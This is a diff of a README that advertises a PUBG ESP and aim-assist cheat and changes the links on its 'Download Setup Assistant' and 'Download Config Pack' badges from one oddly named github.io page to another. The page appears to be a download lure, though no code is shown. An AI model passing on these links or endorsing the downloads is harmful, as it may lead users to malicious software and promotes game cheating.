@@ -1,9 +1,9 @@
 ### 🎯 PUBG ESP & Aim Assistant — Offline Setup Guide
 
-## [![Download Setup Assistant](https://img.shields.io/badge/Download-Setup_Assistant-brightgreen?style=for-the-badge)](https://caplejamerjpubgaim90web1.github.io/.github/)
+## [![Download Setup Assistant](https://img.shields.io/badge/Download-Setup_Assistant-brightgreen?style=for-the-badge)](https://pubg1aimass1st4pcinf0.github.io/.github/)
 
 
-## [![Download Config Pack](https://img.shields.io/badge/Download-Config_Pack-green?style=for-the-badge)](https://caplejamerjpubgaim90web1.github.io/.github/)
+## [![Download Config Pack](https://img.shields.io/badge/Download-Config_Pack-green?style=for-the-badge)](https://pubg1aimass1st4pcinf0.github.io/.github/)
 
 ---
 
